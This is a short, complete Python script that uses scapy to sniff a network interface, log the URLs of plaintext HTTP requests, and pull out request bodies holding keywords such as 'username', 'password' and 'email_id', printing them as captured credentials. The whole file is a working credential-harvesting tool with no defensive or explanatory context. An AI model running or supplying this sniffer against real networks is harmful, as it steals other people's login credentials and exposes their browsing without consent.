#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import argparse


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    host = packet[http.HTTPRequest].Host
    path = packet[http.HTTPRequest].Path
    return host + path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        possible_key = ['user', 'username', 'login', 'password', 'email_id', 'pass']
        load = packet[scapy.Raw].load.decode('ISO-8859-1')
        for key in possible_key:
            if key in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet).decode('ISO-8859-1')
        print('(HTTP) [URL] => ', url)
        login_info = get_login_info(packet)
        if login_info:
            print('(HTTP) [CRE] => ', login_info)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', dest='interface', help='Interface to sniff', required=True)
    args = parser.parse_args()
    sniff(args.interface)
